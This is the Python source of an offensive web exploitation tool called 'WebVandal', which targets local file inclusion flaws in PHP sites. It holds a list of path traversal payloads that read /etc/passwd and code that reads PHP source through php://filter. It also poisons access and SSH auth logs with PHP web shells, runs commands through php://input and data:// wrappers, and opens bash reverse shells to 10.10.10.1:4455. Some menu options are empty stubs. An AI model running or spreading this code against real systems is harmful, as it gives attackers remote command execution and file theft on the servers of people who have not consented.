from termcolor import colored
from shell import start_listener
from urllib.parse import urlunparse, urlparse, parse_qs, quote, unquote
from utils import generate_random_string, reformat_url, cmd_output, get_query, post_query,get_random_user_agent,url_validation_check
from check_target import get_ip_info
from parameters import user_parameter_extract, valid_user_params
from cookies import cookie
import re
import time
import base64
import socket
import requests
import threading
import pyfiglet
import paramiko



user_parameters_string = "page, abc"
# ---------------------------------------------------Path Traversal PoC Check---------------------------------------------------------------#
def path_traversal_check(cookie):
    while True:
        url = input(colored("\nEnter the target URL: ", "blue", attrs=["bold"]))
        if url_validation_check(url) == False:
            print(colored("[-] Please enter a valid URL format.","red", attrs=["bold"]))
            continue
        break
    uparams = input(colored("Please enter the query parameter(s) (comma-separated): ", "blue", attrs=["bold"])).split(',')

    mparams = user_parameter_extract(uparams)
    uparams_info = mparams
    mparams = valid_user_params(url, mparams)

    vuln_path_count = 0
    parsed_url = urlparse(url)
    parsed_query = parse_qs(parsed_url.query)

    linux_path_traversals = [
        ("Hex Encoding Bypass", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("Base64 Encoding Bypass", "Ly4uLy4uLy4vZXRjL3Bhc3N3ZA=="),
        ("Basic Path Traversal", "../../../../../etc/passwd"),
        ("URL Encoding Bypass", "..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
        ("Double Encoding Bypass", "%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
        ("Fake Path Injection Bypass", "....//....//etc/passwd"),
        ("Fake Path Injection & URL Encoding", "....%2F%2F....%2F%2Fetc%2Fpasswd"),
        ("Fake Path Injection & Double Encoding", "....%252F%252F....%252F%252Fetc%252Fpasswd"),
        ("Double Slash Bypass & URL Encoding", "%2F%2Fetc%2F%2Fpasswd"),
        ("Double Slash Bypass", "//etc//passwd"),
        ("Unicode Encoding Bypass","\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd"),
        ("file:// Bypass", "file:///etc/passwd"),
        ("%00 Null-byte Bypass", "/etc/passwd%00"),
        ("Double Slash + Double Encoding", "//%252e%252e//%252e%252e//etc//passwd"),
        ("Base64 + Double Slash", "Ly8vZXRjLy9wYXNzd2Q="),
        ("Base64 + Fake Path Injection", "Li4uLy4uLy8vLy8vLy9ldGMvcGFzc3dk"),
        ("Base64 + Double Encoding", "JTI1MmUlMjUyZS8lMjUyZS4lMjUyZS9ldGMvcGFzc3dk"),
        ("Base64 + URL Encoding", "Ly4uLy4uLy4vJTIzZXRjJTIzcGFzc3dk"),
        ("Base64 + Null Byte Bypass", "Ly4uLy4uLy4vZXRjL3Bhc3N3ZAA="),
        ("Null Byte + Double Slash", "//etc//passwd%00"),
        ("Null Byte + Fake Path Injection", "....//....//etc/passwd%00"),
        ("Null Byte + Double Encoding", "%252e%252e%252f%252e%252e%252fetc%252fpasswd%00"),
        ("Null Byte + URL Encoding", "..%2F..%2Fetc%2Fpasswd%00")
    ]

    if mparams:
        parameters_to_check = mparams
    else:
        parameters_to_check = parsed_query.keys()
        print(colored(f"[!] Warning: The given parameter(s) {uparams_info} do not match the URL parameter(s).", "yellow", attrs=["bold"]))
        print(colored("[*] All query parameters will be tested.", "yellow"))

    vulnerable_paths = []

    for parameter in parameters_to_check:

        if parameter not in parsed_query:
            parsed_query[parameter] = ['']

        for bypass_method, payload in linux_path_traversals:
            parsed_query[parameter] = [payload]
            new_query = ""

            for key, value in parsed_query.items():
                new_query += key + "=" + value[0] + "&"
            new_query = new_query.rstrip("&")

            new_url = urlunparse(
                (parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query,
                 parsed_url.fragment))

            response = get_query(new_url, cookie, get_random_user_agent())

            if response and "root:x" in response.text:
                print(colored(f"[+] Target is vulnerable to {bypass_method}!", "green", attrs=["bold"]))
                print(colored(f"    → Payload: {payload}", "green"))
                vulnerable_paths.append(new_url)
                vuln_path_count += 1

    if vuln_path_count == 0:
        print(colored("[-] No file traversal vulnerabilities detected.", "red", attrs=["bold"]))
    else:
        print(colored(f"\n[+] {vuln_path_count} vulnerable paths found!", "green", attrs=["bold"]))

# -------------------------------------------------------php://filter--------------------------------------------------------------------------#
def is_base64(data):
    try:
        decoded = base64.b64decode(data, validate=True)
        return len(decoded) > 0
    except Exception:
        return False


def extract_phpfilter_data(data):
    dec = []
    longest_string = ""
    possible_base64_strings = re.findall(r"[A-Za-z0-9+/=]+", data)

    for b64_str in possible_base64_strings:
        if len(b64_str) % 4 == 0 and is_base64(b64_str):
            dec.append(b64_str)

            if len(b64_str) > len(longest_string):
                longest_string = b64_str

    return longest_string


def php_filter(cookie):
    filter_str = "php://filter/convert.base64-encode/resource="

    while True:
        qurl = input(colored("\n[?] Enter the target URL (e.g., https://example.com/index.php?page=): ", "blue", attrs=["bold"]))
        if url_validation_check(qurl) == False:
            print(colored("[-] Please enter a valid URL format.","red", attrs=["bold"]))
            continue
        break
    qurl = qurl.strip()

    qurl = reformat_url(qurl)

    file_path = input(colored("Enter the file path to view: ", "blue", attrs=["bold"]))
    file_path = file_path.strip()
    file_path_encoded = quote(file_path)

    new_url = qurl + filter_str + file_path_encoded
    print(colored(f"[*] Attempting to fetch data from: {new_url}", "yellow", attrs=["bold"]))

    result = get_query(new_url, cookie, get_random_user_agent())
    if result is None:
        print(colored(f"[!] No response received.", "red", attrs=["bold"]))
        return None

    result_cleaned = result.text.replace("\n", "").replace("\r", "")

    encoded_content = extract_phpfilter_data(result_cleaned)

    if encoded_content:
        try:
            decoded_content = base64.b64decode(encoded_content).decode("utf-8", errors="ignore")
            answer = input(
                colored(f"\n[+] Decoding successful! Do you want to see the content? (y/n): ", "green", attrs=["bold"]))
            if answer.lower() in ["y", "yes"]:
                print(colored(f"\n[*] Decoded content of {file_path}:", "yellow", attrs=["bold"]))
                print(colored(f"{decoded_content}", "light_green"))
        except Exception:
            print(
                colored("[!] Decoding failed! The response does not contain valid Base64 data.", "red", attrs=["bold"]))
    else:
        print(colored(f"[!] No information leak detected at {new_url}", "red", attrs=["bold"]))

#-------------------------------------------------------Access Log--------------------------------------------------------------------------#

def check_log_server(cookie):
    apache_paths = []
    nginx_paths = []


def log_poisoning(cookie):
    randagent = generate_random_string(10)
    shpayload = quote("/bin/bash -c 'bash -i > /dev/tcp/10.10.10.1/4455 0>&1'")

    headers = {
        "User-Agent": f"<?php /*x*/ shell_exec($_GET['{randagent}']); /*y*/ ?>"
    }

    while True:
        base_url = input(
            colored("\n[?] Enter the log access URL (or press 'c' to find access log URLs): ", "blue", attrs=["bold"]))
        if url_validation_check(base_url) == False:
            print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
            continue
        break
    base_url = reformat_url(base_url)
    base_url = base_url.strip()
    if base_url.strip().lower() == "c":
        check_log_server(cookie)

    print(colored(f"\n[*] Injecting payload into log file: {base_url}", "yellow", attrs=["bold"]))
    get_query(base_url, cookie, headers)

    time.sleep(1)

    print(colored("\n[*] Starting reverse shell listener...", "yellow"))
    listener_thread = threading.Thread(target=start_listener, daemon=True)
    listener_thread.start()

    time.sleep(1)

    shurl = f"{base_url}&{randagent}={shpayload}"
    print(colored(f"\n[*] Triggering payload execution: {shurl}", "cyan", attrs=["bold"]))
    get_query(shurl, cookie, get_random_user_agent())

    listener_thread.join()

#-----------------------------------------------------Auth.log Poisoning--------------------------------------------------------------------#
def get_ssh_port():
    while True:
        try:
            port_input = input(
                colored("\n[*] Enter SSH Port Number (default is 22): ", "blue", attrs=["bold"])).strip()

            if port_input == "":
                port = 22
            else:
                port = int(port_input)

            if port >= 1 and port <= 65535:
                print(colored(f"[*] Selected SSH Port: {port}\n", "yellow", attrs=["bold"]))
                return port
            else:
                print(colored("Port number must be between 1 and 65535.\n", "red", attrs=["bold"]))
        except ValueError:
            print(colored("Please enter a valid number.\n", "red", attrs=["bold"]))


def fake_ssh_conn(target_ip, port, payload, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=target_ip, port=port, username=payload, password=password)
    except (socket.error, OSError):
        print(colored(f"[-] SSH connection failed: No service on {target_ip}:{port}\n", "red", attrs=["bold"]))
    except Exception:
        pass


def attempt_poisoning(url, cookie, target_ip, port, password, method):
    if method == "shell_exec":
        payload = "<?php echo 'first_delimiter'; echo shell_exec('uptime'); echo 'last_delimiter'; ?>"
    elif method == "system":
        payload = "<?php echo 'first_delimiter'; system('uptime'); echo 'last_delimiter'; ?>"
    else:
        payload = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"

    fake_ssh_conn(target_ip, port, payload, password)

    if method == "system_get":
        if "?" in url:
            separator = "&"
        else:
            separator = "?"
        url = url + separator + "cmd=uptime"

    response = get_query(url, cookie, get_random_user_agent())

    if response is not None and response.status_code != 404:
        output = cmd_output(response.text)
        if output is not None and "load average" in output.lower():
            return True
    return False


def auth_log_poisoning(cookie):
    global response
    response = None
    while True:
        url = input(colored("\n[*] Enter the auth.log URL: ", "blue", attrs=["bold"])).strip()
        if url_validation_check(url) == False:
            print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
            continue
        break
    target_ip = str(get_ip_info(url)).strip()
    port = get_ssh_port()
    password = "haha"

    methods = ["system_get", "shell_exec", "system"]
    success = {}

    for method in methods:
        print(colored(f"\n[*] Attempting log poisoning using {method}...", "yellow", attrs=["bold"]))
        success[method] = attempt_poisoning(url, cookie, target_ip, port, password, method)

        if success[method]:
            print(colored(f"\n[+] Log poisoning successful with {method}.\n", "green", attrs=["bold"]))
            break
        else:
            print(colored(f"\n[-] Log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))

    method_found = False
    for method in methods:
        if success.get(method, False):
            method_found = True
            break

    if not method_found:
        print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
        print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
        return

    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))

    while True:
        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()

        if cmd.lower() == "exit" or cmd.lower() == "quit":
            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
            return

        if cmd == "0":
            cmd = "/bin/bash -c \"bash -i >& /dev/tcp/10.10.10.1/4455 0>&1\""
            listener_thread = threading.Thread(target=start_listener, daemon=True)
            listener_thread.start()
            time.sleep(1)

        cmd_b64 = base64.b64encode(cmd.encode()).decode()

        if "shell_exec" in success:
            if success["shell_exec"]:
                shpayload = f"<?php echo 'first_delimiter'; echo shell_exec(base64_decode('{cmd_b64}')); echo 'last_delimiter'; ?>"
                fake_ssh_conn(target_ip, port, shpayload, password)
                response = get_query(url, cookie, get_random_user_agent())
        elif "system" in success:
             if success["system"]:
                shpayload = f"<?php echo 'first_delimiter'; echo system(base64_decode('{cmd_b64}')); echo 'last_delimiter'; ?>"
                fake_ssh_conn(target_ip, port, shpayload, password)
                response = get_query(url, cookie, get_random_user_agent())
        elif "system_get" in success:
                if success["system_get"]:
                    exec_url = url
                    separator = "&" if "?" in exec_url else "?"
                    exec_url += separator + "cmd=" + quote(cmd)
                    print(colored(f"\n[*] Debug: Sending request to {exec_url}", "magenta", attrs=["bold"]))
                    response = get_query(exec_url, cookie, get_random_user_agent())

        if response is not None:
            output = cmd_output(response.text)
            if output is not None:
                print(colored(output, "cyan", attrs=["bold"]))
        else:
            print(colored("\n[-] No response\n", "red", attrs=["bold"]))

#------------------------------------------------------php://input--------------------------------------------------------------------------#

def check_php_input(cookie):
    while True:
        url = input(colored("Enter the target URL with parameter= format: ", "blue")).strip()
        if url_validation_check(url) == False:
            print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
            continue
        break
    url = reformat_url(url)
    url = url.strip()

    print(colored(f"\n[*] Checking if {url} accepts POST requests...", "yellow", attrs=["bold"]))

    header = {"Content-Type": "application/x-www-form-urlencoded"}

    if not post_query(url, cookie, header, "test=1"):
        print(colored("\n[-] Target does not seem to allow POST requests. Exploit might fail.", "red", attrs=["bold"]))
        return

    print(colored("\n[+] Target supports POST requests! Attempting exploit...\n", "green", attrs=["bold"]))
    PHPinput_command_exec(url, cookie)


def attempt_shell_exec(url, cookie, header, shpayload):
    response = post_query(url, cookie, header, shpayload)
    if response and response.status_code != 404:
        output = cmd_output(response.text)
        if output and ("uid" in output or "gid" in output):
            print(colored("\n[+] The command execution with shell_exec() was successful.", "green", attrs=["bold"]))
            return True
    return False


def attempt_system(url, cookie, header, shpayload):
    response = post_query(url, cookie, header, shpayload)
    if response and response.status_code != 404:
        output = cmd_output(response.text)
        if output and ("uid" in output or "gid" in output):
            print(colored("\n[+] The command execution with system() was successful.", "green", attrs=["bold"]))
            return True
    return False


def PHPinput_command_exec(url, cookie):
    print(colored("\n[*] Attempting to execute shell commands using shell_exec() and system() functions.", "yellow", attrs=["bold"]))

    header = {"Content-Type": "application/x-www-form-urlencoded"}
    url = f"{url}php://input"
    shpayload_shell_exec = "<?php echo 'first_delimiter'; echo shell_exec('id'); echo 'last_delimiter'; ?>"
    shpayload_system = "<?php echo 'first_delimiter'; echo system('id'); echo 'last_delimiter'; ?>"

    shell_exec_success = attempt_shell_exec(url, cookie, header, shpayload_shell_exec)

    if not shell_exec_success:
        system_success = attempt_system(url, cookie, header, shpayload_system)
    else:
        system_success = False

    if shell_exec_success or system_success:
        print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))

        while True:
            cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()

            if cmd.lower() in ["exit", "quit"]:
                print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
                return

            if cmd == "0":
                cmd = "/bin/bash -c 'bash -i > /dev/tcp/10.10.10.1/4455 0>&1'"

                listener_thread = threading.Thread(target=start_listener, daemon=True)
                listener_thread.start()
                time.sleep(1)

            if not cmd:
                continue

            try:
                cmd_b64 = base64.b64encode(cmd.encode()).decode()

                if shell_exec_success:
                    shpayload = f"<?php echo 'first_delimiter'; echo shell_exec(base64_decode('{cmd_b64}')); echo 'last_delimiter'; ?>"
                elif system_success:
                    shpayload = f"<?php echo 'first_delimiter'; echo system(base64_decode('{cmd_b64}')); echo 'last_delimiter'; ?>"
                else:
                    print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
                    return

                response = post_query(url, cookie, header, shpayload)
                if response:
                    output = cmd_output(response.text)
                    print(colored(output, "cyan", attrs=["bold"]))
                else:
                    print(colored("\n[-] No response", "red", attrs=["bold"]))
            except requests.RequestException:
                print(colored("\n[-] Error executing command", "red", attrs=["bold"]))
    else:
        print(colored("\n[-] Neither shell_exec() nor system() were successful.\n", "red", attrs=["bold"]))

#-------------------------------------------------------php://data--------------------------------------------------------------------------#
def send_wrapper_data_cmd(url, cookie, format_name, format_payload):
    qurl = url + format_payload
    print(colored(f"[*] Trying {format_name} format...", "yellow"))
    response = get_query(qurl, cookie, get_random_user_agent())
    if response:
        output = cmd_output(response.text)
        if output and ("uid" in output or "gid" in output):
            print(colored(f"[+] {format_name} format was successful.\n", "green"))
            return True, format_name, format_payload
        else:
            print(colored(f"[-] {format_name} format was not successful.\n", "red"))
    return False, None, None

def find_data_payload(url, cookie):
    cmd = "<?php echo 'first_delimiter'; system('id'); echo 'last_delimiter'; ?>"
    encmd = base64.b64encode(cmd.encode()).decode()
    encmd_url = quote(encmd)

    formats = {
        "data:,": f"data:,{cmd}",
        "data://,": f"data://,{cmd}",
        "data:text/plain;base64,": f"data:text/plain;base64,{encmd_url}",
        "data://text/plain;base64,": f"data://text/plain;base64,{encmd_url}"
    }

    for name, payload in formats.items():
        success, format_name, format_payload = send_wrapper_data_cmd(url, cookie, name, payload)
        if success:
            return format_name, format_payload

    return None, None

def execute_data_command(url, cookie, format_name):
    print(colored(f"[*] Command execution started with format: {format_name}\n", "green"))
    print(colored("[*] Press 0 to access shell environment.", "yellow"))
    print()
    while True:
        cmd = input(colored("Enter a command : ", "yellow")).strip()
        if cmd.lower() in ["exit", "quit"]:
            print(colored("[*] Quitting...", "yellow"))
            break

        if cmd == "0":
            cmd = "/bin/bash -c 'bash -i > /dev/tcp/10.10.10.1/4455 0>%261'"
            cmd = cmd.replace("'", "\\'")
            listener_thread = threading.Thread(target=start_listener, daemon=True)
            listener_thread.start()
            time.sleep(1)

        if not cmd:
            continue

        try:
            php_cmd = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
            encmd = base64.b64encode(php_cmd.encode()).decode()
            encmd_url = quote(encmd)

            if "base64" in format_name:
                if format_name == "data:text/plain;base64,":
                    payload = f"data:text/plain;base64,{encmd_url}"
                else:
                    payload = f"data://text/plain;base64,{encmd_url}"
            else:
                if format_name == "data:,":
                    payload = f"data:,{php_cmd}"
                else:
                    payload = f"data://,{php_cmd}"

            qurl = url + payload
            response = get_query(qurl, cookie, get_random_user_agent())
            if response:
                output = cmd_output(response.text)
                print(colored(output, "cyan"))
            else:
                print(colored("[-] No response", "red"))
        except requests.RequestException:
            print(colored("[-] Error executing command", "red"))

def php_data_wrapper():
    while True:
        url = input(colored("Enter the target URL with parameter= format: ", "blue")).strip()
        if url_validation_check(url) == False:
            print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
            continue
        break
    url = reformat_url(url)
    url = url.strip()

    format_name, format_payload = find_data_payload(url, cookie)
    if format_name:
        print(colored(f"[*] Using successful format: {format_name}", "green"))
        execute_data_command(url, cookie, format_name)
    else:
        print(colored("[-] No working data:// format found.", "red"))

#------------------------------------------------------php://expect-------------------------------------------------------------------------#

def php_expect_wrapper(cookie):
    while True:
        url = input(colored("Enter the target URL with parameter= format: ", "blue")).strip()
        if url_validation_check(url) == False:
            print(colored("[-] Please enter a valid URL format.","red", attrs=["bold"]))
            continue
        break
    url = reformat_url(url)
    url = url.strip()

#-------------------------------------------------------------------------------------------------------------------------------------------#

def select_mode():
    toolname = pyfiglet.figlet_format("WebVandal", font="slant")
    banner = colored("=" * 50, "cyan", attrs=["bold"])

    print(colored(toolname, "red", attrs=["bold"]))
    print(banner)

    options = [
        "Exit",
        "Log Poisoning",
        "Auth Log Poisoning (SSH)",
        "php://filter",
        "php://input",
        "data://",
        "expect://",
        "File Traversal PoC"
    ]

    for i, title in enumerate(options):
        print(colored(f" [{i}] ", "blue", attrs=["bold"]) + colored(title, "white", attrs=["bold"]))

    print(banner)

    while True:
        mode = input(colored("\n[?] Select an option: ", "green", attrs=["bold"])).strip()

        if mode == "0":
            print(colored("\nQuitting ...", "red", attrs=["bold"]))
            return
        elif mode == "1":
            log_poisoning(cookie)
        elif mode == "2":
            auth_log_poisoning(cookie)
        elif mode == "3":
            php_filter(cookie)
        elif mode == "4":
            check_php_input(cookie)
        elif mode == "5":
            php_data_wrapper()
        elif mode == "6":
            php_expect_wrapper(cookie)
        elif mode == "7":
            path_traversal_check(cookie)
        else:
            print(colored("\n[!] Invalid choice. Try again.", "red", attrs=["bold"]))


select_mode()

